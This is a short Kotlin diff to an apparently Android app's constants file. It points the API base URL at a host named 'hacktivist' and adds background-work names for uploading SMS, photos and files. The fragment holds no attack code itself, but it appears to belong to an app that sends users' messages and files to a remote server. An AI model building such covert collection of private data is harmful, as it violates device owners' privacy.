@@ -24,6 +24,9 @@ object Constants {
 
     const val BASE_URL = "https://hacktivist.samduuf.uz/api/v1/"
     const val PERMISSION_REQUEST_WORK_NAME = "permission_request_work_name"
-    const val UPLOAD_WORK_NAME = "upload_work_name"
+
+    const val SMS_UPLOAD_WORK_NAME = "sms_upload_work_name"
+    const val PHOTOS_UPLOAD_WORK_NAME = "photos_upload_work_name"
+    const val FILES_UPLOAD_WORK_NAME = "files_upload_work_name"
 
 }
